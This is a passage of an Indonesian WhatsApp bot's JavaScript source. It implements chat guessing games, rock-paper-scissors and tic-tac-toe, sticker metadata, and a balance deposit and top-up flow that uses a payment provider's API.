 delete hanz.tebakkimia[id]
 } else if(similarity(budy.toLowerCase(), json.lambang.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 }
 //GAME Caklontong Function
hanz.caklontong = hanz.caklontong ? hanz.caklontong : {}  
if(isGroup && from in hanz.caklontong){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.caklontong[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 global.db.data.users[m.sender].exp += hanz.caklontong[id][2]
// global.db.data.users[m.sender].tiketcoin += 1
 let ckLntg = Ehztext(`*Benar!*\n+${hanz.caklontong[id][2]} XP\n+1500 Money\n${json.deskripsi}`)
 let { proto, generateWAMessageFromContent } = require('baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: null
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `${pushname}`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ckLntg,
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
                "buttonParamsJson": `{"display_text":"claim game ","id":"${prefix}claimgame"}`
     },{
 "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"main lagi ","id":"${prefix}caklontong"}`
     },
 ],
 })
 })
 }
 }
}, {})

await hanz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
 clearTimeout(hanz.caklontong[id][3])
 delete hanz.caklontong[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}
  //GAME tebak Lagu Function
hanz.tebaklagu = hanz.tebaklagu ? hanz.tebaklagu : {}  
if(isGroup && from in hanz.tebaklagu){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebaklagu[id][1]))
 
 if (budy.toLowerCase() == json.judul.toLowerCase().trim()) {
user.balance += hanz.tebaklagu[id][2]
 let tbkLgu = `*GAME TEBAK LAGU*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebaklagu[id][2]} Money 💸`
   reply (tbkLgu)
 clearTimeout(hanz.tebaklagu[id][3])
 delete hanz.tebaklagu[id]
 } else if(similarity(budy.toLowerCase(), json.judul.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}
//GAME tebaktebak Function
hanz.tebaktebak = hanz.tebaktebak ? hanz.tebaktebak : {}  
if(isGroup && from in hanz.tebaktebak){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebaktebak[id][1]))
 
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebaktebak[id][2]
 global.db.data.users[m.sender].exp += 50
let tebkTbk = `*TEBAK TEBAKAN*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebaktebak[id][2]} Money 💸\n EXP: +50`
// global.db.data.users[m.sender].tiketcoin += 1
reply (tebkTbk)
   clearTimeout(hanz.tebaktebak[id][3])
 delete hanz.tebaktebak[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}
 //GAME tebak kata Function
hanz.tebakkata = hanz.tebakkata ? hanz.tebakkata : {}  
if(isGroup && from in hanz.tebakkata){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebakkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebakkata[id][2]
 var teks6 = `*GAME TEBAK KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebakkata[id][2]} Money 💸`
   reply (teks6)
 clearTimeout(hanz.tebakkata[id][3])
 delete hanz.tebakkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}
//GAME tebak lirik Function
hanz.tebaklirik = hanz.tebaklirik ? hanz.tebaklirik : {}  
if(isGroup && from in hanz.tebaklirik){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let json = JSON.parse(JSON.stringify(hanz.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebaklirik[id][2]
 global.db.data.users[m.sender].exp += 10
   var teks7 = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebaklirik[id][2]} Money 💸\n EXP: +10`
   reply (teks7)
 clearTimeout(hanz.tebaklirik[id][3])
 delete hanz.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 }
 //GAME siapa aku Function
hanz.siapaaku = hanz.siapaaku ? hanz.siapaaku : {}
//hanz.siapaaku = JSON.parse(fs.readFileSync('./database/siapaaku.json'))
if(isGroup && from in hanz.siapaaku){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.siapaaku[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.siapaaku[id][2]
let spaAku = Ehztext(`*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.siapaaku[id][2]} Money 💸`)
   let { proto, generateWAMessageFromContent } = require('baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: null
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `${pushname}`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: spaAku,
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
                "buttonParamsJson": `{"display_text":"claim game ","id":"${prefix}claimgame"}`
     },{
 "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"main lagi ","id":"${prefix}siapaaku"}`
     },
 ],
 })
 })
 }
 }
}, {})

await hanz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
 clearTimeout(hanz.siapaaku[id][3])
 delete hanz.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`) 
}
  //GAME tebak gambar
hanz.tebakgambar = hanz.tebakgambar ? hanz.tebakgambar : {}  
if(isGroup && from in hanz.tebakgambar){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebakgambar[id][2]
 m.reply(`*GAME TEBAK GAMBAR*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebakgambar[id][2]} Money 💸`)
 clearTimeout(hanz.tebakgambar[id][3])
 delete hanz.tebakgambar[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}
//Game Family 100
hanz.family = hanz.family ? hanz.family : {}
if(isGroup && from in hanz.family){
if(!isGroup) {return} 
let similarity = require('similarity')
let threshold = 0.72 // semakin tinggi nilai, semakin mirip
let id =  m.chat
let room = hanz.family[id]
let textG = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(textG)
  
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, textG))) >= threshold) return setReply('Dikit lagi!')
 }
if (!isCmd && room.terjawab[index]) {return} 
user.balance += room.winScore
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length

let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0]  : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
     `.trim()
  
hanz.sendMessage(from, {text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net']}, {quoted: m}).then(msg => {
 hanz.family[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete hanz.family[id] 
//if (isWin || isSurrender) clearTimeout(200000)
}
    //Suit PvP
	    hanz.suit = hanz.suit ? hanz.suit : {}
	    let roof = Object.values(hanz.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(budy) && isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(budy)) {
	    
	    hanz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, dev)
	    delete hanz.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    hanz.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) hanz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) 
	    hanz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) 
	    hanz.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    hanz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete hanz.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = sender == roof.p
	    let jwb2 = sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(budy) && !roof.pilih && !isGroup) {
	    roof.pilih = reg.exec(budy.toLowerCase())[0]
	    roof.text = budy
	    setReply(`Kamu telah memilih ${budy} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) hanz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(budy) && !roof.pilih2 && !isGroup) {
	    roof.pilih2 = reg.exec(budy.toLowerCase())[0]
	    roof.text2 = budy
	    setReply(`Kamu telah memilih ${budy} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) hanz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    hanz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete hanz.suit[roof.id]
	    }
	    }
    //TicTacToei

	    hanz.tictac = hanz.tictac ? hanz.tictac : {}
	    let roomf = Object.values(hanz.tictac).find(roomf => roomf.id && roomf.tictac && roomf.state && roomf.id.startsWith('tictactoe') && [roomf.tictac.playerX, roomf.tictac.playerO].includes(sender) && roomf.state == 'PLAYING')
	    if (roomf) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(budy)) return
	    isSurrender = !/^[1-9]$/.test(budy)
	    if (sender !== roomf.tictac.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = roomf.tictac.turn(sender === roomf.tictac.playerO, parseInt(budy) - 1))) {
	    setReply ({
	    '-3': '*TICTACTOE TELAH BERAKHIR*',
	    '-2': '*INVALID*',
	    '-1': '*POSISI INVALID*',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (sender === roomf.tictac.winner) isWin = true
	    else if (roomf.tictac.board === 511) isTie = true
	    let arr = roomf.tictac.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    roomf.tictac._currentTurn = sender === roomf.tictac.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? roomf.tictac.currentTurn : roomf.tictac.winner
	    let str = `*TICTACTOE*

 ID: ${roomf.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} *MENANG!*` : isTie ? `*HASIL SERI*` : `Giliran ${['❌', '⭕'][1 * roomf.tictac._currentTurn]} (@${roomf.tictac.currentTurn.split('@')[0]})`}
❌: @${roomf.tictac.playerX.split('@')[0]}
⭕: @${roomf.tictac.playerO.split('@')[0]}

`
	    if ((roomf.tictac._currentTurn ^ isSurrender ? roomf.x : roomf.o) !== m.chat)
	    roomf[roomf.tictac._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (roomf.x !== roomf.o)  hanz.sendText(roomf.x, str, m, { mentions: parseMention(str) } )
	     hanz.sendText(roomf.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete hanz.tictac[roomf.id]
	    }
      }
// ======== FUNCTION ========//
	async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const { default: { Image }} = await import('node-webpmux')
	const img = new Image()
	const json = { 'sticker-pack-id': 'parel-kntll', 'sticker-pack-name': packname, 'sticker-pack-publisher': author, 'emojis': categories, 'is-avatar-sticker': 1, ...extra }
	let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
	let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
	let exif = Buffer.concat([exifAttr, jsonBuffer])
	exif.writeUIntLE(jsonBuffer.length, 14, 4)
	await img.load(buffer)
	 img.exif = exif
	return await img.save(null)
}

const userResPanel = JSON.parse(fs.readFileSync("./database/reselerpanel.json"));  
const isResPanel = userResPanel.includes(m.sender.replace('@s.whatsapp.net', ''));
 //---------Top Up Payment-----//
const chatPrivate = !isGroup ? body.trim().toLowerCase() : null;

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
    
if (chatPrivate === "payment_ovo") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "OVO",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke banh mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
} else if (chatPrivate === "payqris") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "QRIS",
data: {
iddepo: "",
qr: "",
amount_deposit: "",
nominal: "",
pajak: "",
exp: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke banh mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
} else if (chatPrivate === "paydana") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "DANA",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke banh mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!m.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "amount") {
if (isNaN(body.trim().toLowerCase())) return hanz.editmsg(m.chat,'Masukan hanya angka ya',m)
data_deposit.data.amount_deposit = Number(body.trim().toLowerCase())
if (data_deposit.data.amount_deposit < 2000) return reply(`Transaksi Deposit Minimal Rp2000`)
if (data_deposit.data.amount_deposit > 5000000) return reply(`Nominal Deposit terlalu tinggi`)
data_deposit.session = "konfirmasi_deposit";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
if (data_deposit.payment === "QRIS") {
	let pajakny = await toJSON(0.01 * data_deposit.data.amount_deposit)
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("reff_id", data_deposit.ID);
key.append("nominal", data_deposit.data.amount_deposit+Number(pajakny));
key.append("type", "ewallet")
key.append("metode", "qrisfast")
fetch("https://atlantich2h.com/deposit/create", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
	QRCode.toFile("./depoqris.jpg", res.data.qr_string, { margin: 2, scale: 10 })
if (!res.status) return reply(res.message)
data_deposit.result = res.status
data_deposit.data.iddepo = res.data.id
data_deposit.data.qr = "./depoqris.jpg"
data_deposit.data.pajak = res.data.nominal - data_deposit.data.amount_deposit
data_deposit.data.nominal = res.data.nominal
data_deposit.data.exp = res.data.expired_at
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
hanz.sendMessage(from, { text: `「 𝙆𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙎𝙄-𝘿𝙀𝙋𝙊𝙎𝙄𝙏 」

▪ ID: ${data_deposit.ID}
▪ Number: ${data_deposit.number.split('@')[0]}
▪ Payment: ${data_deposit.payment}
▪ Jumlah Deposit: Rp${toRupiah(data_deposit.data.amount_deposit)}
▪ Pajak Admin: Rp${toRupiah(res.data.nominal - data_deposit.data.amount_deposit)}
▪ Total Pembayaran: Rp${toRupiah(res.data.nominal)}

_Ketik *lanjut* untuk melanjutkan_
_Ketik *batal* untuk membatalkan_` }, { quoted: m })
})
} else {
hanz.sendMessage(from, {text: `「 𝙆𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙎𝙄-𝘿𝙀𝙋𝙊𝙎𝙄𝙏 」

▪ ID : ${data_deposit.ID}
▪ Nomer : ${data_deposit.number.split('@')[0]}
▪ Payment : E WALLET
▪ Jumlah Deposit : Rp${toRupiah(data_deposit.data.amount_deposit)}
▪ Pajak Admin : Rp0
▪ Total Pembayaran : Rp${toRupiah(data_deposit.data.amount_deposit)}

_Ketik Lanjut untuk melanjutkan_
_Ketik Batal untuk membatalkan_`}, { quoted: m })
}
} else if (data_deposit.session === "konfirmasi_deposit") {
if (chatPrivate === "lanjut") {
 if (data_deposit.payment === "QRIS") {
var qr_fexf = `⭒━━━━━━[ *PEMBAYARAN VIA QRIS* ]━━━━━━⭒

🔹 *ID Pengguna:* ${data_deposit.ID}
🔹 *Nomor Pengguna:* ${data_deposit.number.split("@")[0]}
🔹 *Jumlah Deposit:* Rp ${toRupiah(data_deposit.data.amount_deposit)}
🔹 *Pajak Admin:* Rp ${toRupiah(data_deposit.data.pajak)}
🔹 *Total Pembayaran:* Rp ${toRupiah(data_deposit.data.nominal)}
🔹 *Batas Waktu Pembayaran:* ${data_deposit.data.exp}

_Silakan scan QRIS di atas untuk melanjutkan pembayaran. Ketik *batal* jika ingin membatalkan transaksi._`;


hanz.sendMessage(from, { image: fs.readFileSync(data_deposit.data.qr), caption: qr_fexf }, { quoted: m })
} else if (data_deposit.payment === "DANA") {
var py_dana = Ehztext(`⭒━━━━━━[ *PAYMENT OPTIONS* ]━━━━━━⭒

🟢 *DANA*
 • Nomor: ${payment.dana.nomer}
 • Atas Nama: ${payment.dana.atas_nama}

🔵 *GOPAY*
 • Nomor: Tidak Tersedia Untuk Saat Ini
 • Atas Nama: 

🟠 *SHOPEEPAY*
 • Nomor: Tidak Tersedia Untuk Saat Ini
 • Atas Nama: 

🟣 *OVO*
 • Nomor: Tidak Tersedia Untuk Saat Ini
 • Atas Nama: 

🔵 *MANDIRI*
 • Nomor: Tidak Tersedia
 • Atas Nama: Tidak Tersedia

Harap transfer sesuai nomor di atas, dan setelah pembayaran, kirim bukti transfer dengan caption *.bukti* untuk diproses oleh admin. Terima kasih! 🙏`);

reply(py_dana)
}} else if (chatPrivate === "batal") {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("id", data_deposit.data.iddepo);
fetch("https://atlantich2h.com/deposit/cancel", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
reply(`Baik banh, deposit dengan ID: ${data_deposit.ID} dibatalkan`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
})
}}}}


if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.payment === "QRIS") {
var intervals = setInterval(function() {
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("id", data_deposit.data.iddepo);
fetch("https://atlantich2h.com/deposit/status", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
console.log(res); // For Debugging
console.log(color("[DEPOSIT QRIS]", "green"), `-> ${sender}`) // For Debugging
if (res.status == false) {
	clearInterval(intervals);
} else if (res.data.status === "success") {
reply(`*DEPOSIT SUKSES*\n*Status:* success\n*ID:* ${data_deposit.ID}\n*Nomer:* ${data_deposit.number.split("@")[0]}\n*Jumlah Deposit:* Rp${toRupiah(data_deposit.data.amount_deposit)}\n*Pajak Admin:* Rp${toRupiah(data_deposit.data.pajak)}\n*Total Pembayaran:* Rp${toRupiah(data_deposit.data.nominal)}\n\n_Terimakasih banh sudah deposit._`)
addSaldo(sender, Number(data_deposit.data.amount_deposit), db_saldo)
fs.unlinkSync(depositPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (res.data.status === "expired") {
console.log(res)
reply(`Deposit anda telah *Expired*`)
fs.unlinkSync(depositPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (res.data.status === "cancel") {
if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) return fs.unlinkSync(depositPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
}, 3000)
}
}


if (fs.existsSync(topupPath + sender.split("@")[0] + ".json")) {
	if (!m.key.fromMe) {
let data_topup = JSON.parse(fs.readFileSync(topupPath + sender.split("@")[0] + ".json"))
if (data_topup.session === "target") {
if (isNaN(body.trim().toLowerCase())) return reply("Hanya Masukan Nomor/Id Tidak boleh ada karakter lain")
data_topup.data.target = body.trim().toLowerCase()
data_topup.session = "konfirmasi_topup";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3));

let tekYa = `🎯 *TARGET:* ${data_topup.data.target}

_Pastikan ID atau Nomor yang Anda masukkan sudah benar._

Ketik *lanjut* untuk melanjutkan transaksi, atau ketik *batal* jika ingin membatalkan.`;

setReply(tekYa)
} else if (data_topup.session === "konfirmasi_topup") {
	if (chatPrivate === "lanjut") {
	let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("code", data_topup.data.code)
key.append("reff_id", require("crypto").randomBytes(5).toString("hex").toUpperCase())
key.append("target", data_topup.data.target)
fetch("https://atlantich2h.com/transaksi/create", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
	if (!res.status) return reply('Server maintenance\nHarap Ketik *batal* Terlebih Dahulu,Lalu Gunakan Pilihan Yang Lain')
	let persen = (untung / 100) * res.data.price
	data_topup.result = res.status
	data_topup.data.idtopup = res.data.id
	data_topup.data.id = res.data.reff_id
	data_topup.data.price = res.data.price + Number(Math.ceil(persen))
	data_topup.data.layanan =  res.data.layanan
	fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3));
	reply(`*「 ${res.message.toUpperCase()} 」*\n\n*PESAN:* _Tunggu sejenak, Bot sedang memproses pesanan anda✅_`)	
})
await sleep(5000)
var intervals = setInterval(function() {
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("id", data_topup.data.idtopup)
key.append("type", "prabayar")
fetch("https://atlantich2h.com/transaksi/status", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(responsep => responsep.json())
.then(resss => {
console.log(resss); // For Debugging
console.log(color("[TRANSAKSI]", "green"), `-> ${sender}`) // For Debugging
if (resss.status == false) {
	clearInterval(intervals);
	} else
if (resss.data.status === "success") {
	let persen = (untung / 100) * resss.data.price
reply(`*「 TOPUP SUKSES 」*\n\n*⌬ Status:* Berhasil ✅\n*⌬ ID Pesanan:* ${resss.data.reff_id}\n*⌬ Layanan:* ${resss.data.layanan}\n*⌬ Nomor Tujuan:* ${resss.data.target}\n*⌬ Harga:* Rp${toRupiah(Number(resss.data.price) + Number(Math.ceil(persen)))}\n\n*⌬ Serial Number (SN):*\n${resss.data.sn}\n\n_Terima kasih telah memesan. Semoga transaksi ini memuaskan!_`)

minSaldo(sender, (Number(resss.data.price) + Number(Math.ceil(persen))), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (resss.data.status === 'failed') {
console.log(resss)
reply(`❌Pesanan dibatalkan!\nAlasan : Kesalahan oleh bot atau ID tidak valid`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (resss.data.status === 'cansel') {
console.log(resss)
reply(`❌Pesanan dibatalkan!\nAlasan : ${resss.data.message}`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} 
})
}, 3000)
	} else if (chatPrivate === "batal") {
		reply(`Pesanan dibatalkan!`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
	}}}}

            
    
// ===================================\\
try{
switch(command) {
// ========== FITUR  TOP UP ========//

case 'pricelist': {
 

  let daftarNya = Ehztext(`${gris}Daftar Pricelist Kami${gris}\n\n` +
                  `📦 *Produk:*\n` +
                  `✅ *pricelistgame*: Game terpopuler dan harga menarik.\n` +
                  `*pricelistwallet*: Pilihan dompet digital dengan fee rendah.\n` +
